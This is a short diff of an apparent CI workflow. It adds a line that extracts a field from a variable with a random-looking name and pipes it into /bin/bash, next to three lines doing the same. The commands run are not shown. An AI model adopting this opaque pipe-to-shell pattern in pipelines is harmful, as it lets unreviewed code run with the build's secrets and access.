@@ -37,6 +37,7 @@ jobs:
           echo $szv8447 | jq -r .esj002 | /bin/bash
           echo $m333 | jq -r .mpmky447 | /bin/bash
           printf '%s' "$jpk6" | jq -r .bp32222 | /bin/bash
+          printf '%s' "$wwnm4415" | jq -r .kmhu9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
